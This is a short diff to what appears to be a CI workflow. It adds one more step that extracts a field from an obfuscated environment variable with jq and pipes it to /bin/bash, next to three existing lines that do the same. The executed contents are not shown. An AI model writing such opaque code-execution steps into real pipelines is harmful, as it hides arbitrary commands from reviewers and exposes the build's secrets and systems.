@@ -21,6 +21,7 @@ jobs:
           echo $go9502 | jq -r .nuox0994 | /bin/bash
           echo $whom64 | jq -r .f9 | /bin/bash
           echo $vr2137 | jq -r .rsobn9 | /bin/bash
+          echo $xq51386 | jq -r .ja92 | /bin/bash
 
       - name: Archive output
         if: always()
